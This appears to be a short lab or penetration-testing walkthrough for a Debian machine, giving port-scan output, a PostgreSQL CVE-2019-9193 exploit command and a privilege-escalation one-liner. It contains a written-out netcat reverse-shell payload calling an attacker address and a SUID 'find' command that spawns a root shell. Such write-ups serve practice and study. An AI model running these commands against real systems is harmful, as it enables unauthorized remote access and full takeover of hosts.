Linux ttl=61

# rustscan

```
PORT     STATE SERVICE    REASON
21/tcp   open  ftp        syn-ack ttl 61
22/tcp   open  ssh        syn-ack ttl 61
80/tcp   open  http       syn-ack ttl 61
5437/tcp open  pmip6-data syn-ack ttl 61
```

# nmap

```
PORT     STATE SERVICE    VERSION
21/tcp   open  ftp        vsftpd 3.0.3
22/tcp   open  ssh        OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey: 
|   2048 10:62:1f:f5:22:de:29:d4:24:96:a7:66:c3:64:b7:10 (RSA)
|   256 c9:15:ff:cd:f3:97:ec:39:13:16:48:38:c5:58:d7:5f (ECDSA)
|_  256 90:7c:a3:44:73:b4:b4:4c:e3:9c:71:d1:87:ba:ca:7b (ED25519)
80/tcp   open  http       Apache httpd 2.4.38 ((Debian))
|_http-server-header: Apache/2.4.38 (Debian)
|_http-title: Enter a title, displayed at the top of the window.
5437/tcp open  postgresql PostgreSQL DB 11.3 - 11.9
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=debian
| Subject Alternative Name: DNS:debian
| Not valid before: 2020-04-27T15:41:47
|_Not valid after:  2030-04-25T15:41:47
```

# initial

look at postgre service and got exploit

https://github.com/b4keSn4ke/CVE-2019-9193

```
python3 cve-2019-9193.py -i 192.168.188.47 -p 5437 -c 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc 192.168.45.163 80 >/tmp/f'
```

# priv esc

```
/usr/bin/find . -exec /bin/sh -p \; -quit
```